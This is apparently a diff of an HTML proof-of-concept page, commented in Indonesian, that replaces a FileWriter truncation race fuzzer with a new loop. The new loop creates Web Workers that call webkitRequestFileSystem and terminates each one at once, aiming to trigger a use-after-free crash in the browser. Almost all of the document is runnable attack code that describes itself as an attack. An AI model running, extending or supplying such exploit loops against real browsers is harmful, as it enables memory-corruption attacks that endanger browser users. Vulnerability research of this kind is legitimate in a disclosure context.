@@ -2,163 +2,174 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>FileWriter Unvalidated Length PoC</title>
+    <title>Worker FileSystem Use-After-Destroy PoC</title>
     <style>
-        body { font-family: 'Consolas', monospace; padding: 20px; background: #222; color: #ddd; }
-        #console { background: #000; border: 1px solid #444; height: 400px; overflow-y: scroll; padding: 10px; font-size: 12px; }
-        .log-info { color: #0f0; }
-        .log-warn { color: #ff0; }
-        .log-error { color: #f00; }
-        .log-crit { color: #f0f; font-weight: bold; }
-        button { padding: 10px; margin: 5px; cursor: pointer; font-weight: bold; }
-        button#start { background: #006400; color: white; border: none; }
-        button#stop { background: #8b0000; color: white; border: none; }
+        body { font-family: 'Consolas', monospace; padding: 20px; background: #1a1a2e; color: #eee; }
+        #log { background: #0f0f23; border: 1px solid #444; height: 400px; overflow-y: scroll; padding: 10px; font-size: 11px; white-space: pre-wrap; }
+        .info { color: #00d4ff; }
+        .warn { color: #ffaa00; }
+        .error { color: #ff4444; }
+        .success { color: #00ff88; }
+        button { padding: 10px 20px; margin: 5px; cursor: pointer; font-weight: bold; border: none; border-radius: 4px; }
+        #btnStart { background: #006400; color: white; }
+        #btnStop { background: #8b0000; color: white; }
+        #btnClear { background: #333; color: #ccc; }
+        .stats { margin: 10px 0; padding: 10px; background: #252540; border-radius: 4px; }
     </style>
 </head>
 <body>
 
-    <h2>FileWriter::Initialize Length Race Condition</h2>
-    <p>Mencoba memicu <code>DidCreateFileWriter</code> dengan metadata file yang tidak stabil.</p>
+    <h2>🔬 WorkerGlobalScope FileSystem UaD PoC</h2>
+    <p>Trigger: <code>webkitRequestFileSystem</code> in Worker + Immediate <code>worker.terminate()</code></p>
     
     <div>
-        <button id="start" onclick="startAttack()">Start Fuzzing</button>
-        <button id="stop" onclick="stopAttack()">Stop</button>
-        <span id="status">Status: Idle</span>
+        <button id="btnStart" onclick="startAttack()">▶ Start Race Loop</button>
+        <button id="btnStop" onclick="stopAttack()">⏹ Stop</button>
+        <button id="btnClear" onclick="clearLog()">🗑 Clear Log</button>
     </div>
-    <br>
-    <div id="console"></div>
+    
+    <div class="stats">
+        Iterations: <span id="count">0</span> | 
+        Status: <span id="status" class="warn">IDLE</span> | 
+        Target API: <code>webkitRequestFileSystem</code> (Async)
+    </div>
+    
+    <div id="log"></div>
+
+    <!-- Inline Worker Script (Blob) -->
+    <script id="worker-code" type="javascript/worker">
+        // Kode ini akan dieksekusi DI DALAM Worker Global Scope
+        self.onmessage = function(e) {
+            const { action, quota } = e.data;
+            
+            if (action === 'attack') {
+                // 1. Minta quota dulu agar operasi filesystem benar-benar terjadi (IPC)
+                if (self.webkitPersistentStorage) {
+                    self.webkitPersistentStorage.requestQuota(quota, function(granted) {
+                        // 2. Panggil API async yang rentan
+                        // Callback C++ DidOpenFileSystem akan dipanggil nanti via task queue
+                        self.webkitRequestFileSystem(
+                            self.TEMPORARY, 
+                            1024, 
+                            function success(fs) {
+                                // ⚠️ RACE CONDITION ZONE:
+                                // Jika worker sudah terminate saat callback ini dipanggil,
+                                // ExecutionContext sudah invalid → Crash/UAF
+                                self.postMessage({ type: 'callback-fired', name: fs ? fs.name : 'null' });
+                            }, 
+                            function error(err) {
+                                self.postMessage({ type: 'callback-error', code: err.code });
+                            }
+                        );
+                    }, function(err) {
+                        // Jika request quota gagal, tetap coba call filesystem langsung
+                        triggerFileSystem();
+                    });
+                } else {
+                    triggerFileSystem();
+                }
+            }
+            
+            function triggerFileSystem() {
+                self.webkitRequestFileSystem(
+                    self.TEMPORARY, 1024,
+                    function(fs) { self.postMessage({type:'cb', ok:true}); },
+                    function(e) { self.postMessage({type:'cb', ok:false}); }
+                );
+            }
+        };
+    </script>
 
     <script>
-        let isRunning = false;
-        let fs = null;
-        let fileEntry = null;
-        let iteration = 0;
-        const consoleDiv = document.getElementById('console');
+        const logDiv = document.getElementById('log');
+        const countSpan = document.getElementById('count');
         const statusSpan = document.getElementById('status');
+        let isRunning = false;
+        let iteration = 0;
+        let workerBlob = null;
+        let WorkerURL = null;
 
-        function log(msg, type = 'log-info') {
+        function log(msg, cls = 'info') {
             const line = document.createElement('div');
-            line.className = type;
-            line.textContent = `> ${msg}`;
-            consoleDiv.appendChild(line);
-            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+            line.className = cls;
+            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logDiv.appendChild(line);
+            logDiv.scrollTop = logDiv.scrollHeight;
         }
 
-        // 1. Setup FileSystem (Legacy API)
-        async function initFS() {
-            return new Promise((resolve, reject) => {
-                if (!window.webkitRequestFileSystem) {
-                    log("ERROR: WebKit File System API not supported in this browser.", "log-error");
-                    reject("API Not Supported");
-                    return;
-                }
-                
-                // Request 10MB Temporary Storage
-                window.webkitRequestFileSystem(window.TEMPORARY, 10 * 1024 * 1024, (filesystem) => {
-                    fs = filesystem;
-                    log("FileSystem acquired.", "log-info");
-                    
-                    // Create or get a test file
-                    fs.root.getFile('fuzz_target.dat', { create: true }, (entry) => {
-                        fileEntry = entry;
-                        log("Target file ready: fuzz_target.dat", "log-info");
-                        resolve();
-                    }, (e) => reject(e));
-                }, (e) => reject(e));
-            });
+        function clearLog() {
+            logDiv.innerHTML = '';
+            iteration = 0;
+            countSpan.textContent = '0';
         }
 
-        async function startAttack() {
+        function startAttack() {
             if (isRunning) return;
             isRunning = true;
-            statusSpan.textContent = "Status: RUNNING";
-            statusSpan.style.color = "#0f0";
-            document.getElementById('start').disabled = true;
-
-            try {
-                await initFS();
-                log("Starting Race Condition Loop...", "log-warn");
-                loopAttack();
-            } catch (e) {
-                log("Initialization failed: " + e, "log-error");
-                isRunning = false;
+            statusSpan.textContent = 'RACING...';
+            statusSpan.className = 'success';
+            document.getElementById('btnStart').disabled = true;
+            
+            // Buat Blob URL untuk inline worker (lebih cepat dari file eksternal)
+            if (!WorkerURL) {
+                const workerCode = document.getElementById('worker-code').textContent;
+                workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+                WorkerURL = URL.createObjectURL(workerBlob);
             }
+            
+            log("Starting Worker FileSystem Race Loop...", "warn");
+            loopAttack();
         }
 
         function stopAttack() {
             isRunning = false;
-            statusSpan.textContent = "Status: STOPPED";
-            statusSpan.style.color = "#f00";
-            document.getElementById('start').disabled = false;
-            log("Attack stopped by user.", "log-error");
+            statusSpan.textContent = 'STOPPED';
+            statusSpan.className = 'error';
+            document.getElementById('btnStart').disabled = false;
+            log("Attack stopped by user.", "error");
         }
 
-        // 2. The Attack Loop
         async function loopAttack() {
             while (isRunning) {
                 iteration++;
+                countSpan.textContent = iteration;
                 
-                // Jalankan dua aksi secara paralel untuk memicu race condition
-                // 1. Minta Writer (yang akan memanggil DidCreateFileWriter)
-                const writerPromise = getWriter();
+                // 1. Buat worker baru setiap iterasi (ExecutionContext baru)
+                const worker = new Worker(WorkerURL);
                 
-                // 2. Ubah ukuran file secara acak (memaksa backend update metadata)
-                const truncatePromise = truncateFileRandomly();
-
-                await Promise.allSettled([writerPromise, truncatePromise]);
-
-                // Delay sangat singkat agar event loop tidak macet tapi race tetap mungkin
-                await new Promise(r => setTimeout(r, 0)); 
+                // 2. Setup listener untuk callback dari worker (jika sempat jalan)
+                worker.onmessage = (e) => {
+                    const data = e.data;
+                    if (data.type === 'callback-fired') {
+                        log(`⚠️ Callback fired after terminate?! FS: ${data.name}`, "error");
+                    }
+                };
+                
+                worker.onerror = (e) => {
+                    // Error dari worker yang sudah terminate adalah hal yang diharapkan
+                    // log(`Worker error: ${e.message}`, "info");
+                };
+                
+                // 3. Kirim perintah attack ke worker
+                worker.postMessage({ action: 'attack', quota: 10 * 1024 * 1024 });
+                
+                // 4. ⚡ THE KILL: Terminate worker SEGERA setelah posting message
+                // Ini memicu teardown WorkerGlobalScope sebelum async IPC selesai
+                worker.terminate();
+                
+                if (iteration % 100 === 0) {
+                    log(`Iteration ${iteration}... still racing`, "info");
+                }
+                
+                // Yield ke event loop agar UI tetap responsif dan race lebih natural
+                await new Promise(resolve => setTimeout(resolve, 0));
             }
         }
 
-        // Aksi A: Meminta FileWriter (Entry point ke DidCreateFileWriter)
-        function getWriter() {
-            return new Promise((resolve) => {
-                if (!fileEntry) return resolve();
-                
-                fileEntry.createWriter(
-                    (writer) => {
-                        // Jika berhasil dapat writer, segera coba truncate lagi
-                        // Ini membebani inisialisasi internal
-                        try {
-                            // Mencoba truncate ke nilai besar atau negatif (jika JS mengizinkan)
-                            // JS biasanya memblokir negatif, tapi kita coba batas integer
-                            writer.truncate(0); 
-                        } catch(e) {}
-                        resolve();
-                    },
-                    (e) => {
-                        // Error biasa dalam race condition
-                        resolve(); 
-                    }
-                );
-            });
-        }
-
-        // Aksi B: Mengacaukan Metadata File
-        function truncateFileRandomly() {
-            return new Promise((resolve) => {
-                if (!fileEntry) return resolve();
-
-                fileEntry.createWriter(
-                    (writer) => {
-                        // Generate ukuran acak. 
-                        // Catatan: JS tidak bisa mengirim int64 negatif ke API ini secara langsung,
-                        // tapi kita bisa mencoba nilai maksimum atau 0 berulang kali.
-                        const randomSize = Math.floor(Math.random() * 1024 * 100); 
-                        
-                        writer.onwriteend = () => resolve();
-                        writer.onerror = () => resolve();
-                        
-                        try {
-                            writer.truncate(randomSize);
-                        } catch(e) { resolve(); }
-                    },
-                    (e) => resolve()
-                );
-            });
-        }
+        // Cleanup saat halaman unload
+        window.addEventListener('beforeunload', () => {
+            if (WorkerURL) URL.revokeObjectURL(WorkerURL);
+        });
     </script>
 </body>
 </html>
